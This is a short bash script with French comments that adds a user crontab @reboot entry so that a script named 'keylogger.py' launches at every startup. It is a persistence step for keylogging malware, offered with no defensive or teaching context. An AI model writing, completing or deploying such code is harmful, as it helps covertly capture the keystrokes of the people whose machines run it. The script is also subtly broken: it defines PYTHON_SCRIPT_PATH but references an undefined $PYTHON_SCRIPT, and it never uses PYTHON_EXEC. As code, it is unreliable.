#!/bin/bash

# Variables
PYTHON_SCRIPT_PATH="keylogger.py"

# Chemin vers l'interpréteur Python
PYTHON_EXEC=$(which python3)

# Ajouter la tâche @reboot à la crontab de l'utilisateur courant
echo "Ajout de la tâche cron pour lancer le script Python au démarrage..."

# Vérification pour éviter les doublons
(crontab -l 2>/dev/null | grep -q "$PYTHON_SCRIPT") || (crontab -l 2>/dev/null; echo "@reboot python3 $PYTHON_SCRIPT") | crontab -
echo "La tâche cron a été ajoutée pour exécuter le script Python au démarrage."
